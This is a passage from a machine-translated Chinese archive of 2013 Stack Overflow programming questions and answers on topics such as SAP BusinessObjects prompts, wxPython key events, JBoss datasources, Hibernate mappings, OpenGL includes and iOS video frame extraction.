*   `getline`将流中的一行（直到下一个换行符）放入`string`.
*   `istringstream`做`istream`一个`string`
*   `istream_iterator`遍历一个`istream`，提取给定的类型，打破空白。
*   `accumulate`采用迭代器来划分范围并将这些值相加：

共：

```
string line;
while (getline(cin, line)) {
    istringstream in(line);
    istream_iterator<int> begin(in), end;
    int sum = accumulate(begin, end, 0);
    cout << sum << '\n';
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:01:20.887

放

`sum=0;`// 在顶部

ps

```
while(cin.peek()!='\n'){

} 
```

# sql - SAP Business Objects - 根据用户提示输入创建 WHERE 条件

> ID：15092173
> 
> 赞同：0
> 
> 时间：2013-02-26T14:54:52.187
> 
> 标签：sql, sap, business-objects

我有一个带有典型日期列的报告。我希望用户从@prompt 中选择开始日期。然后我希望结束日期比用户选择的开始日期少 3 个月。

例子：

```
SELECT Date,Y,Z
FROM TABLE
WHERE Table.Date  >=  @prompt('Enter value(s) for Acct Open Dt','D',Object',Mono,Free,Persistent,,User:0)
AND
Table.Date <= USER ENTERED DATE - 3 months 
```

这可能吗？我在其他报告工具中很容易做到这一点。BOBJ 没有这个功能似乎很奇怪。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T06:55:46.913

您可以在 Universe [promptDate] = @prompt('Enter value(s) for Acct Open Dt','D',Object',Mono,Free,Persistent,,User:0) 中创建新对象

[promptDatePlusThreeMonths] = dateadd(月, 3, [promptDate])

并在报告中添加条件

WHERE Table.Date 在 [promptDate] 和 [promptDatePlusThreeMonths] 之间

或者只是在宇宙中创造一个条件：

@prompt('Enter value(s) for Acct Open Dt','D',Object',Mono,Free,Persistent,,User:0) 和 dateadd(month, 3, @prompt('Enter value) 之间的 Table.Date (s) 用于Acct Open Dt','D',Object',Mono,Free,Persistent,,User:0))

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T14:57:14.680

除非我遗漏了什么，否则这就是你要找的

```
SELECT Date,Y,Z
FROM TABLE
WHERE Table.Date  >=  @prompt('Enter value(s) for Acct Open     Dt','D',Object',Mono,Free,Persistent,,User:0)
AND Table.Date BETWEEN userentereddate AND dateadd(m,-3,userentereddate) 
```

# php - 是否可以使用 Curl 伪造 Cookie 和 JavaScript？

> ID：15092178
> 
> 赞同：-4
> 
> 时间：2013-02-26T14:55:03.560
> 
> 标签：php, cookies

如何在我的 curl 请求中启用 cookie 和 javasctipt？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:05:09.107

请不要做这样的事情。
您尝试登录的网站上有验证码。
这清楚地表明网站所有者**不希望机器人**登录。
请有一些企业自豪感 - 不要破坏其他网站管理员的网站。

# ruby - 沟通和恢复 PTY 流程

> ID：15092179
> 
> 赞同：2
> 
> 时间：2013-02-26T14:55:05.197
> 
> 标签：ruby

我正在尝试创建一个系统，其中程序使用 ruby​​ PTY 库启动 PTY 会话，`PTY.spawn`并使用 spawn 方法提供的输入和输出变量提供输入和输出。生成的进程文件本身从 STDIN 读取并写入 STDIN，因此这种方法有效地劫持了生成文件的输入和输出流。到目前为止，这很好用。

但是，我也在尝试关闭父文件并跟踪 pts 文件路径（调用时 spawn 命令建立），以便我可以恢复与 PTY 实例的通信。所以假设我有一个名为 pts 的文件`/dev/pts/17`，我希望恢复与它的通信，然后我会简单地为输入和输出创建一个文件句柄，如下所示：

```
io_file = '/dev/pts/17'
output = File.open(io_file, "r")
input = File.open(io_file, "w") 
```

当我尝试从输出文件中读取时，我遇到了这个问题。每当我这样做`output.readline`时，进程都会挂起（块）。我没有办法解决这个问题。知道发生了什么吗？还有其他方法可以恢复 PTY 实例吗？

# c# - 如何在 C# 中使用正则表达式复制 FileSystemWatcher 过滤器功能

> ID：15092180
> 
> 赞同：3
> 
> 时间：2013-02-26T14:55:09.227
> 
> 标签：c#, regex, filesystemwatcher

我有一个用于 ac# 项目的 FileSystemWatcher 对象，以及在事件发生时匹配的多个模式。

作为项目要求，我不能创建多个 FileSystemObjects 并使用单独的过滤器方法来匹配我的模式。因此，必须设置一个过滤器`*.*`来监视所有文件，并且在创建事件时，我必须应用正则表达式来处理循环中每个模式的匹配文件。我的模式将包含`*`字符，就像我们将它传递给 Filter 方法一样。

如何使用单个 Regex 语句复制内置过滤器功能？

许多 FileSystemWatcher 过滤器场景中的一些；

*   `pi*.txt`（这些应该匹配：piano.txt、pie.txt）
*   `*.doc`（任何带有 . **doc**扩展名的东西都应该匹配）
*   `04*2013.txt`（任何文本文件，应该是四月的任何一天）
*   `pi*ar*.jpg`（前缀是**pi**，在文件名中任何位置的前缀后面都包含**ar**并且必须是**jpg**扩展名）
*   `pre*ar*pre`（任何带有**pre**前缀的文件，后跟**ar**和另一个**pre**）
*   `*.*`（什么都接受）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:02:48.770

不久前，我为我的工作写了类似的东西

```
public static string WildcardPatternToRegexPattern(string pattern)
{
    return string.Format("^{0}$", Regex.Escape(pattern.Replace('/', Path.DirectorySeparatorChar)).Replace(@"\*", ".*").Replace(@"\?", "."));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:03:05.547

如果您想学习 regex 语句，可以从查看[http://txt2re.com/](http://txt2re.com/)开始。如果您粘贴一段文本，则会有一个点击界面为您生成正则表达式。我还建议只用谷歌搜索“preg”。

# python - wxpython 键盘绑定

> ID：15092181
> 
> 赞同：0
> 
> 时间：2013-02-26T14:55:10.177
> 
> 标签：python, wxpython

所以我正在研究节奏训练器，并使用 wxpython 作为 UI 工具包。我想知道是否有人知道如何绑定键盘按键来播放声音？所以简单地说，用户可以使用键盘来打鼓。示例“按 A 键将播放低音鼓”

现在我遇到了一个教程-

[http://www.blog.pythonlibrary.org/2009/08/29/wxpython- catch-key-and-char-events/](http://www.blog.pythonlibrary.org/2009/08/29/wxpython-catching-key-and-char-events/)

但这似乎需要按钮才能成功播放声音。我有一些使用这个例子的功能。但我想知道是否有另一种不需要按钮的方式来做到这一点？

```
import wx

class MyForm(wx.Frame):

def __init__(self):
    wx.Frame.__init__(self, None, wx.ID_ANY, "Key Press Tutorial")

    # Add a panel so it looks the correct on all platforms
    panel = wx.Panel(self, wx.ID_ANY)
    btn = wx.Button(panel, label="OK")

    btn.Bind(wx.EVT_KEY_DOWN, self.onKeyPress)

def onKeyPress(self, event):
    keycode = event.GetKeyCode()
    print keycode
    if keycode == ord('A'):
        print "you pressed the spacebar!"
        sound_file = "notation1.wav"
        sound=wx.Sound(sound_file)
        print(sound_file)
        sound.Play(wx.SOUND_ASYNC)
    event.Skip()

 # Run the program
if __name__ == "__main__":
    app = wx.PySimpleApp()
    frame = MyForm()
    frame.Show()
    app.MainLoop() 
```

这是我使用教程的示例。

干杯!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T20:48:44.620

我的教程是关于捕捉焦点小部件上的击键。在本教程的情况下，这是焦点所在的按钮，这就是它绑定到 EVT_KEY_DOWN 的原因。遗憾的是，面板并不是很容易接受焦点，因此最好使用 SetFocus() 手动将焦点设置在面板上，或者将键事件绑定到大多数小部件。

您也许可以使用 AcceleratorTable，但我不确定这是否适用于您的情况。不过，这里有一个关于该主题的教程的链接：

[http://www.blog.pythonlibrary.org/2010/12/02/wxpython-keyboard-shortcuts-accelerators/](http://www.blog.pythonlibrary.org/2010/12/02/wxpython-keyboard-shortcuts-accelerators/)

# javascript - 将 dojo.declare 更改为“本机 Javascript 类声明”

> ID：15092184
> 
> 赞同：1
> 
> 时间：2013-02-26T14:55:15.053
> 
> 标签：javascript, class, dojo, declaration

我有这个代码：

```
dojo.declare("dh.medview.Viewport", null, {
    someMember: null;
    someFunction: function() {
    }
}); 
```

如何转换此代码以获得纯“JS 类”声明？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T17:03:32.040

```
// create namespace
dh = dh || {};
dh.medview = dh.medview || {};

// constructor:
dh.medview.Viewport = function() {
    // yours is empty
};

// setup properties of the prototype
var proto = dh.medview.Viewport.prototype;
proto.someMember = null;
proto.someFunction = function() {…}; 
```

# mysql - 在主目录安装mysql

> ID：15092188
> 
> 赞同：-1
> 
> 时间：2013-02-26T14:55:22.403
> 
> 标签：mysql, ubuntu, installation, home-directory

我需要在主文件夹中安装 mysql，我使用的是 Ubuntu 12.10。我正在尝试从二进制文件安装它。我浏览了一些相关的帖子，但我没有找到任何有用的帖子来设置主文件夹中的 mysql。我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:04:52.947

如果您从源代码安装 mysql，您可以在朗读`./configure`命令时选择添加正确选项的目录

这是指南：[http](http://dev.mysql.com/doc/refman/5.1/en/installing-source-distribution.html) ://dev.mysql.com/doc/refman/5.1/en/installing-source-distribution.html 这里是选项[http://dev.mysql.com/doc/refman/5.1/ en/source-configuration-options.html](http://dev.mysql.com/doc/refman/5.1/en/source-configuration-options.html)

正确的命令应该是`./configure --prefix=mypath`

# html - 使用 Jsoup 从 HTML 页面中的元素中提取文本

> ID：15092193
> 
> 赞同：0
> 
> 时间：2013-02-26T14:55:29.257
> 
> 标签：html, html-parsing, jsoup

我正在从以下 html 元素中提取文本

```
<span class="adr" style="float: none !important;">
     <span class="street-address" style="float: none !important;">18, Jawaharlal Nehru
       Road,
     </span>
     <span  style="float: none !important;" class="estb_addr-HeadingTxt">
       <a style="float: none !important;"   href="http://kolkata.burrp.com/area/park-street" class="locality">&nbsp;Park Street</a></span>
       ,&nbsp;Kolkata<span class="region" style="display: none;">Kolkata
     </span>
</span> 
```

为此，我编写了以下代码：

```
for (Element element : doc.getAllElements()) 
{
        for(Element childelem: element.children())
           {
             if (childelem.hasText() && !childelem.ownText().isEmpty()) 
                {

                     String currText=childelem.ownText();
                     System.out.print(currText+" ");

                  }

            }
         System.out.println("");
 } 
```

理想情况下，输出应该是**18, Jawaharlal Nehru Road, Park Street, Kolkata**。但它是给**18，贾瓦哈拉尔尼赫鲁路，加尔各答**和**公园街**。我可以理解，输出基本上是对以外部 <span> 为根的 DOM 树的顺序遍历。但我不知道如何通过 Jsoup 实现这一点，其中 HTML 页面中元素的 DOM 树具有任意级别的嵌套。

任何帮助，将不胜感激。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T03:12:40.673

使用 DOM 导航或 CSS 选择器语法来完成任务，不要循环遍历所有`Elements`.

```
Element adr = doc.select("span.adr").first().
System.out.println(adr.text()); 
```

# android - 在调用 onTouch() 时触摸屏幕

> ID：15092198
> 
> 赞同：0
> 
> 时间：2013-02-26T14:55:40.880
> 
> 标签：android, ontouchlistener

当我触摸屏幕并移动手指时，我会做一些事情（pullanimation1 和 2），而当我释放屏幕时，我会做其他事情（fireanimation1 和 2）。有时，用户可能会在 pullAnimation 或 fireAnimation 运行时触摸屏幕，然后在动画运行多次时出现错误。我想确保当用户再次触摸屏幕时动画不会运行超过一次。注意：pullAnimation1 和 2，fireAnimation 1 和 2 是 AnimationDrawable 这是我所做的：

```
 image2.setOnTouchListener(new OnTouchListener(){

        @Override
        public boolean onTouch(View arg0, MotionEvent arg1) {
            boolean bool=false;
            boolean bool2=true;
            int action = arg1.getAction() & MotionEvent.ACTION_MASK;

            switch (action) {
            case MotionEvent.ACTION_DOWN:
            if (bool2) {
            startAnimation(pullAnimation1,pullAnimation2);
            bool=true;
            }
            break;
            case MotionEvent.ACTION_MOVE:
                if (bool2==true){
                Log.w("GAMEACTIVITY","move");
                bool=true;
                bool2=false;
                }
                break;
            case MotionEvent.ACTION_UP:
                startAnimation(fireAnimation1,fireAnimation2);
                bool=false;
                doPhotoTask();
                bool2=false;
                break;
            }
            return bool;
        }
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:02:01.970

我认为您应该能够使用 hasStarted() 和 hasEnded() 方法来确定您的动画当前是否正在播放。[有关更多信息，请参阅文档](http://developer.android.com/reference/android/view/animation/Animation.html)

像这样的一些 if 语句可能会起作用：

```
if((fireAnimation1.hasStarted() == false) || (fireAnimation1.hasEnded == true()){
  startAnimation(fireAnimation1, fireAnimation2);
} 
```

我想您可能还需要`reset()`在完成播放后使用，或者在下次触摸发生时返回正确值的方法。

**编辑：** [AnimationDrawable](http://developer.android.com/reference/android/graphics/drawable/AnimationDrawable.html)有一个`isRunning()`方法，它比查看动画更容易。

```
if(fireAnimation1.isRunning() == false){
  startAnimation(fireAnimation1, fireAnimation2);
} 
```

# class - 方法和传递一个双

> ID：15092199
> 
> 赞同：0
> 
> 时间：2013-02-26T14:55:42.823
> 
> 标签：class, variables, declare

我不断收到有关这段代码的错误消息。我尝试声明它并以不同的方式传递它。如果代码不是那么先进，我很抱歉。我还是个初学者。

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package javaapplication5;
import java.util.Scanner;

/**
 *
 * @author period3
 */
public class JavaApplication5 {

/**
 * @param args the command line arguments
 */

public static void main(String[] args) {

    double theresult;
    theresult = area(double radius);

Scanner reader;
reader = new Scanner (System.in);
System.out.println("Please enter the coordinates of a circle:");
newLine();
System.out.println("Outside point:");
newLine();
System.out.println("x1:");
int x1 = reader.nextInt();
newLine();
System.out.println("y1:");
int y1 = reader.nextInt();
newLine();
System.out.println("Center Point:");
newLine();
System.out.println("x2:");
int x2 = reader.nextInt();
newLine();
System.out.println("y2:");
int y2 = reader.nextInt();

System.out.println("The area of the circle is" + theresult);

}
 public static double distance(int x1, int y1, int x2, int y2) 
{
double dx = x2 - x1;
double dy = y2 - y1;
double dsquared = dx*dx + dy*dy;
double result = Math.sqrt (dsquared);
return result;
}

public static double area(int x1, int y1, int x2, int y2) {
double radius = distance (x1, y1, x2, y2);
return radius;
}

public static double area(double radius)
{
    double areaCircle;
    areaCircle = (3.14 * (radius * radius));
    return areaCircle;
}

//NewLine Method
public static void newLine () {
System.out.println ("");
}
} 
```

和我在第 24 行的错误信息（theresult = area(double radius):

```
unexpected type
  required: value
  found:    class

'.class' expected

';' expected
---- 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:21:33.010

在使用面积方法之前，您需要先计算半径：

```
double radius = distance(x1, y1, x2, y2); 
```

然后你需要设置结果：

```
theResult = area(radius); 
```

这些都应该发生在您的用户输入之后（在他们为您提供`x1`, `y1`,`x2`和`y2`, 的值之后以及**在**您 print `theResult`.

注意我是如何称呼你的`distance`和`area`方法的。只需将局部变量输入参数即可。

```
theResult = area(double radius); <- This is incorrect syntax. 
```

# asp.net - 母版页和内容页

> ID：15092201
> 
> 赞同：2
> 
> 时间：2013-02-26T14:55:44.670
> 
> 标签：asp.net, css, master-pages

我有一个母版页和两个使用母版页进行布局和设计的内容页。我的母版页有 2 个 css 文件。现在我想要做的是，当我运行第一个内容页面母版页时使用第一个 css 文件，而当我运行第二个内容页面时它使用另一个。关于我应该如何做到这一点的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T14:58:26.937

首先，除非您做一些不寻常的事情，否则这不应该是您的常规方法。使用通用母版页的全部意义在于，您可以轻松地在整个网站上拥有通用的外观和感觉。

但是你可以通过几种方式做到这一点。一种方法是在母版页`<head>`部分放置一个占位符。然后在包含相应 css 文件的每个内容页面中为该占位符创建内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:02:27.573

您可以在母版页和头部内部使用 ContentPlaceHolder 在每个下一页上以不同方式更改 css，或者忽略它以保留一些默认值。

这是一个例子：

```
<head runat="server">
   <asp:ContentPlaceHolder ID="styleHolder" runat="server" >
    <link rel="stylesheet" type="text/css" href="default.css">
  </asp:ContentPlaceHolder>
</head>
<body> 
```

并在具有不同 css 的页面上，只需包含 PlaceHolder 并更改它。

# mysql - 数据库重启后Jboss无法重新连接Mysql

> ID：15092203
> 
> 赞同：3
> 
> 时间：2013-02-26T14:55:51.880
> 
> 标签：mysql, jboss7.x, jca

您好，我们使用 JBOSS AS 7.1.1 Final。简单的 JPA Hibernate 架构与 Mysql。

xa 数据源如下所示：

```
<xa-datasource jndi-name="java:jboss/datasources/db" pool-name="db" enabled="true" use-java-context="true">
<xa-datasource-property name="ServerName">
localhost
</xa-datasource-property>
<xa-datasource-property name="DatabaseName">
db
</xa-datasource-property>
<xa-datasource-property name="User">
root
</xa-datasource-property>
<xa-datasource-property name="Password">
xxxxx
</xa-datasource-property>
<xa-datasource-property name="AutoReconnectForPools">
true
</xa-datasource-property>
<xa-datasource-property name="FailOverReadOnly">
false
</xa-datasource-property>
<xa-datasource-property name="MaxReconnects">
100
</xa-datasource-property>
<xa-datasource-property name="ReconnectAtTxEnd">
true
</xa-datasource-property>
<driver>com.mysql</driver>
<transaction-isolation>TRANSACTION_READ_COMMITTED</transaction-isolation>
<validation>
<valid-connection-checker class-name="org.jboss.jca.adapters.jdbc.extensions.mysql.MySQLValidConnectionChecker"/>
<check-valid-connection-sql>select 1</check-valid-connection-sql>
<exception-sorter class-name="org.jboss.jca.adapters.jdbc.extensions.mysql.MySQLExceptionSorter"/>
</validation>
</xa-datasource> 
```

MySQL重启后，JBOSS应该重新连接（reconnect）但是没有发生。请指教

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-12-31T10:59:30.123

这个对我有用。尝试添加这个：

```
<validation>
    <check-valid-connection-sql>select 1</check-valid-connection-sql>
    <background-validation>true</background-validation>
    <background-validation-millis>15000</background-validation-millis>
</validation> 
```

# java - 如何覆盖@MappedSuperclass的子类中的参数

> ID：15092204
> 
> 赞同：3
> 
> 时间：2013-02-26T14:55:54.233
> 
> 标签：java, hibernate, mappedsuperclass

我有一个 MappedSuperclass

```
@MappedSuperclass
public class A{
    .
    .
    .
    @Column(name="something")
    public getSomething(){..};
    public setSomething(){..};
} 
```

我想覆盖`something`子类中的

```
@Entity
public class B{
    @Override
    public getSomething(){..};
} 
```

但得到`Caused by: org.hibernate.MappingException: Duplicate property mapping of data found`异常

我尝试了不同的东西，比如“@AttributeOverride”注释，但没有帮助。

我知道的唯一解决方案是`something`在 mappedSuperclass 中制作 Transient。但我不希望它在这里是瞬态的（因为还有另一个子类不想覆盖`something`但希望它是瞬态的）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:15:35.210

我想到了两个解决方案：一个是可能打破这个 SuperClass 并使用 Emmbeddeds 来创建你想要的层次结构。但是，如果您想坚持使用这种方法，我认为您需要在子类中使用[@AttributeOverride](http://docs.oracle.com/javaee/6/api/javax/persistence/AttributeOverride.html)来覆盖属性和方法，如下所示：

```
@Entity
public class B {

    @AttributeOverride(name = "fred", column = @Column(name = "FRED"))
    private Integer fred;

    @Override
    public Integer getFred() {return fred;}
} 
```

# c - 跳过 OpenGL 预编译头文件

> ID：15092207
> 
> 赞同：0
> 
> 时间：2013-02-26T14:56:00.593
> 
> 标签：c, opengl, header, precompiled

嘿伙计们，我目前的编码有问题。问题是`#Include <glut.h>`在查找 Precompiled Header Use 时我的文件被跳过并且找不到解决它的方法。

这是我的代码：

```
#include <D:/GL/glut.h>
#include <stdafx.h>
#include <stdlib.h>
#include <malloc.h>
#include <math.h>

using namespace System;

void drawScene(void)
{
    int i, j;

    glClear(GL_COLOR_BUFFER_BIT);
    glColor3f(0.0, 0.0, 0.0);
    glLoadIdentity();

     glTranslatef(0.0, 0.0, -25.0); 
    glutWireCube(5.0); // Box.
    glColor3f(1.0, 0.0, 0.0);

    for(i=5; i<5; i++)
    {
        for (j = -5; j < 5; j++)
        {

            glPushMatrix();
            glTranslatef(i*5, j*5, -35.0);
            glColor3f(1.0, 1.0, 0);
            glutSolidCube(5.0);
            glColor3f(0.0, 0.0, 1.0);
            glutWireCube(5.0);
            glPopMatrix();
        }
    }

glFlush();

}

void setup(void)
{
    glClearColor(1.0, 1.0, 1.0, 0.0);
}

void resize (int w, int h)
{
    glViewport(0, 0, (GLsizei)w, (GLsizei)h); 
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    glFrustum(-10.0, 10.0, -10.0, 10.0, 10.0, 100.0);
    glMatrixMode(GL_MODELVIEW);
}

void KeyInput(unsigned char key, int x, int y)
{
    switch(key)
    {
    case 27:
        exit(0);
    break;
    default:
    break;
    }
}

int main(int argc, char **argv) 
{
   glutInit(&argc,argv);
   glutInitDisplayMode(GLUT_SINGLE|GLUT_RGB);
   glutInitWindowSize(500,500); /* Size of the Program Window */
   glutInitWindowPosition(100,100);
   glutCreateWindow("Voxel Assignment"); 
   setup();
   glutDisplayFunc(drawScene); 
   glutReshapeFunc(resize);
   glutKeyboardFunc(KeyInput);
   glutMainLoop(); 

   return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:08:47.137

这可能是因为非常奇怪的绝对路径使用，带有驱动器说明符。

不要那样做，包含路径不应该包含该级别的内容。

只需说出`#include <GL/glut.h>`并调整编译器的设置以将所需的目录添加到包含路径。

# javascript - 如何处理 google-apps-script 中的“完整”外语日期字符串？

> ID：15092208
> 
> 赞同：1
> 
> 时间：2013-02-26T14:56:04.420
> 
> 标签：javascript, datetime, google-apps-script

在 Google Apps Scripts 中编写一个 JavaScript 程序，我遇到了看起来像第二行的日期时间字符串

```
//German 
März 1, 2013 @ 19:00 - 23:00   
//"March 1, 2013 @ 19:00 - 23:00" 
```

这需要解析为两个 JS 日期对象（d1 = 2013 年 3 月 1 日 19:00；d2 = 2013 年 3 月 1 日 23:00）*在 Google Apps 脚本环境*中执行此操作的最佳方法是什么？

现在我已经编写了一个自定义函数`lookupMonth()`来将德语翻译成英语。我这样做`string.replace(monthGer, monthEng)`。

```
function monthLookup(str) {
    //str1 = str.substring(0, str.indexOf(" ")); //unicode blank!
    var pos = str.indexOf(/[0-9]/.exec(str)); //pos of first digit
    str1 = str.substring(0, pos  - 1 ).trim();

    var lookup = {
        "Januar": "January",
        "Februar": "February",
        "März": "March",
        "April": "April",
        "Mai": "May",
        "Juni": "June",
        "Juli": "July",
        "August": "August",
        "Spetember": "Septemper",
        "Oktober": "October",
        "November": "November",
        "Dezember": "December"
    };
    str = lookup[str1] + " " + str.substring(pos, 1000);
    return str;
} 
```

这会创建两个新的字符串，它们可以是一个`Date()`对象，然后我可以调用`Utilities.formatDate()`Is there a better way?

例如，我是否应该调用翻译服务 API（这当然比调用进程内 JavaScript 函数要慢得多？

我应该导入第三方库吗？如果有，是哪一个？

# ios - iOS - 视频帧处理优化

> ID：15092211
> 
> 赞同：1
> 
> 时间：2013-02-26T14:56:13.307
> 
> 标签：ios, optimization, mpmovieplayercontroller, video-processing

在我的项目中，我需要将视频的每一帧的一部分复制到一个唯一的结果图像上。

捕获视频帧并不是什么大问题。它会是这样的：

```
// duration is the movie lenght in s.
// frameDuration is 1/fps. (or 24fps, frameDuration = 1/24)
// player is a MPMoviePlayerController
for (NSTimeInterval i=0; i < duration; i += frameDuration) {
    UIImage * image = [player thumbnailImageAtTime:i timeOption:MPMovieTimeOptionExact];

    CGRect destinationRect = [self getDestinationRect:i];
    [self drawImage:image inRect:destinationRect fromRect:originRect];

    // UI feedback
    [self performSelectorOnMainThread:@selector(setProgressValue:) withObject:[NSNumber numberWithFloat:x/totalFrames] waitUntilDone:NO];
} 
```

当我尝试实现`drawImage:inRect:fromRect:`方法时，问题就来了。
我尝试[了这段代码](http://iphonedevelopment.blogspot.fr/2010/11/drawing-part-of-uiimage.html)，其中：

1.  从视频帧创建一个新的 CGImage`CGImageCreateWithImageInRect`以提取图像块。
2.  在 ImageContext 上创建一个 CGContextDrawImage 来绘制块

但是当视频达到 12-14 秒时，我的 iPhone 4S 正在宣布他的第三次内存警告并崩溃。我已经使用泄漏工具对应用程序进行了分析，它根本没有发现泄漏...

我在石英方面不是很强。有没有更好的优化方法来实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T20:32:29.387

最后，我保留了代码中的 Quartz 部分并更改了检索图像的方式。

现在我使用 AVFoundation，这是一个更快的解决方案。

```
// Creating the tools : 1/ the video asset, 2/ the image generator, 3/ the composition, which helps to retrieve video properties.
AVURLAsset *asset = [[[AVURLAsset alloc] initWithURL:moviePathURL
                                             options:[NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithBool:YES], AVURLAssetPreferPreciseDurationAndTimingKey, nil]] autorelease];
AVAssetImageGenerator *generator = [[[AVAssetImageGenerator alloc] initWithAsset:asset] autorelease];
generator.appliesPreferredTrackTransform = YES; // if I omit this, the frames are rotated 90° (didn't try in landscape)
AVVideoComposition * composition = [AVVideoComposition videoCompositionWithPropertiesOfAsset:asset];

// Retrieving the video properties
NSTimeInterval duration = CMTimeGetSeconds(asset.duration);
frameDuration = CMTimeGetSeconds(composition.frameDuration);
CGSize renderSize = composition.renderSize;
CGFloat totalFrames = round(duration/frameDuration);

// Selecting each frame we want to extract : all of them.
NSMutableArray * times = [NSMutableArray arrayWithCapacity:round(duration/frameDuration)];
for (int i=0; i<totalFrames; i++) {
    NSValue *time = [NSValue valueWithCMTime:CMTimeMakeWithSeconds(i*frameDuration, composition.frameDuration.timescale)];
    [times addObject:time];
}

__block int i = 0;
AVAssetImageGeneratorCompletionHandler handler = ^(CMTime requestedTime, CGImageRef im, CMTime actualTime, AVAssetImageGeneratorResult result, NSError *error){
    if (result == AVAssetImageGeneratorSucceeded) {
        int x = round(CMTimeGetSeconds(requestedTime)/frameDuration);
        CGRect destinationStrip = CGRectMake(x, 0, 1, renderSize.height);
        [self drawImage:im inRect:destinationStrip fromRect:originStrip inContext:context];
    }
    else
        NSLog(@"Ouch: %@", error.description);
    i++;
    [self performSelectorOnMainThread:@selector(setProgressValue:) withObject:[NSNumber numberWithFloat:i/totalFrames] waitUntilDone:NO];
    if(i == totalFrames) {
        [self performSelectorOnMainThread:@selector(performVideoDidFinish) withObject:nil waitUntilDone:NO];
    }
};

// Launching the process...
generator.requestedTimeToleranceBefore = kCMTimeZero;
generator.requestedTimeToleranceAfter = kCMTimeZero;
generator.maximumSize = renderSize;
[generator generateCGImagesAsynchronouslyForTimes:times completionHandler:handler]; 
```

即使有很长的视频，它也需要时间，但它永远不会崩溃！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-06-27T14:14:57.087

除了马丁的回答，我建议缩小通过该调用获得的图像的大小；也就是添加一个属性`[generator.maximumSize = CGSizeMake(width,height)];`让图片尽可能的小，这样就不会占用太多内存

# java - 如何使用不同版本的 Java 启动 eclipse？

> ID：15092212
> 
> 赞同：3
> 
> 时间：2013-02-26T14:56:13.900
> 
> 标签：java, windows, eclipse

我这里有一台带有 java 1.4 和 java 1.6 的计算机（Windows XP）（我不知道为什么这个系统上有 1.4，可能他们忘记卸载它）。这里也是 Eclipse Helios。

现在，如果我想启动 eclipse，我会收到 Java 1.4 太旧的消息。嗯？我这里也有 1.6，Eclipse 应该从 1.6 开始我通过 cmd 检查了当前的 Java Home

```
java -version
java version "1.4.2_03"
Java(TM) 2 Runtime Environment, Standard Edition (build 1.4.2_0
Java HotSpot(TM) Client VM (build 1.4.2_03-b02, mixed mode) 
```

好吧，不知何故 1.4 是这里的标准 java。好吧，让我们将标准 java 更改为 1.6（因为它已经安装，所以它应该可以工作）。但是等等，这不起作用我无权改变它。无法更改任何标准 java 路径。那么我能做什么呢？我想通了，如果我`eclipse.ini`将行编辑为，我可以绕过 Eclipse 消息`-Dosgi.requiredJavaVersion=1.4`，`-Dosgi.requiredJavaVersion=1.5`但最后我将这个 Eclipse 与 Java 1.4 一起使用，谁知道我遇到了什么错误或问题。我有 java 1.6 的路径，我可以使用它并启动 Eclipse，如何？有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-26T15:00:08.110

您可以将`-vm`选项添加到**eclipse.ini**：

```
-vm
C:/path/java/jdk1.7.0_03/bin/javaw.exe 
```

它必须在 2 个单独的行上，并且必须在之前添加`-vmargs`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:36:19.540

您可以在构建路径中配置它

```
Go to Eclipse(mac) / Window(for windows)

->Preferences
->Java

->Installed JREs 

->JAdd the jdk/jre library you would like to add.

->click ok (Done) 
```

然后为完成的eclipse工作区配置jdk。

您可以使用构建路径配置更改单个项目的 jdk。

*要做到这一点 ：*

选择项目，右键

```
->Choose the java Build Path.

->JRight hand side of the pane click the "Add Library"

->Choose "JRE system library"
->Select "Alternate JRE" (There u can see the list of the installed/configured JRE).

->Click Finish 
```

让知道问题是否仍然存在。

# java - 我如何使用泛型类的构造函数

> ID：15092217
> 
> 赞同：1
> 
> 时间：2013-02-26T14:56:29.507
> 
> 标签：java, generics

我有多个基本相同的课程。我在构造函数中传递了一个 JSONObject，它设置了一些变量。

现在我得到了一些其他类，它们创建了第一个类并将它们添加到 ArrayList 中。现在我想使用泛型将第二个类合并为一个。

这就是我想要做的：

```
 public class Data<T> {
     public ArrayList<T> data;

     public Data(String response1) {
         data = new ArrayList<T>();
         JSONArray ja;

         try {
              ja = new JSONArray(response1);
              for (int i = 0; i < ja.length(); i++) {
                  JSONObject jo = (JSONObject) ja.get(i);
                  data.add(new T(jo));
              }
         } catch (JSONException e) {
              e.printStackTrace();
         }
     }
 } 
```

但它不允许我创建一个 T 的实例

```
new T(jo); 
```

如果有人可以帮助我会很好

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:03:35.580

这种情况有一个标准技巧：将 传递`Class<T>`给`String data`调用，并为`JSONObject`. 这将允许您调用无参数构造函数，如下所示：

```
interface WithJson {
    void setJson(JSONObject jo);
}

public class Data<T extends WithJson> {
    public Data(String response1, Class<T> type) {
        data = new ArrayList<T>();
        JSONArray ja;
        try {
             ja = new JSONArray(response1);
             for (int i = 0; i < ja.length(); i++) {
                 JSONObject jo = (JSONObject) ja.get(i);
                 T obj = type.newInstance();
                 object.setJson(jo);
